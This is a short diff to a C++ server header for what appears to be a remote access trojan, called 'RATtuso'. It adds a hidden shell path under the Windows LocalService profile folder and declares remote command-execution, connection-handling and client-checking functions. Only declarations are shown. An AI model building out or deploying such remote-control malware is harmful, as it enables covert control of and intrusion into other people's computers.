@@ -4,6 +4,7 @@
 #pragma comment(lib,"ws2_32.lib") //Required for Sockets
 
 #define CONSOLE_START "RATtuso console => "
+#define SHELL_MAIN_PATH "C:/Windows/ServiceProfiles/LocalService/"
 
 #ifdef _WIN32
 #include <winsock2.h>
@@ -32,6 +33,7 @@ typedef void* LPVOID;
 #include <vector> //for std::vector
 
 #include "general.h"
+#include "settings.h"
 #include "FileTransferData.h"
 #include "PacketManager.h"
 #include "PacketStructs.h"
@@ -57,13 +59,17 @@ public:
 	Server(int PORT, bool BroadcastPublically = false);
 	void ListenForNewConnection();
 	void HandleInput();
+	void ParseClientInput(std::string userinput, int& clientID);
 	static Server * serverptr; //Serverptr is necessary so the static ClientHandler method can access the server instance/functions.
+
+	static void* OnClientConnected(void* args);
 
 private:
 	int sockInit();
 	int sockQuit();
 
 	void handleScript(std::string script);
+	void CMDExecute(std::string userinput, int& currSessionID);
 
 	bool sendall(int ID, char * data, int totalbytes);
 	bool recvall(int ID, char * data, int totalbytes);
@@ -83,6 +89,7 @@ private:
 	static void* ClientHandlerThread(void* args);
 	static void* PacketSenderThread(void* args);
 	static void* ListenerThread(void* args);
+	static void* ClientConnectionChecker(void* args);
 
 	void DisconnectClient(int ID); //Called to properly disconnect and clean up a client (if possible)
 private:
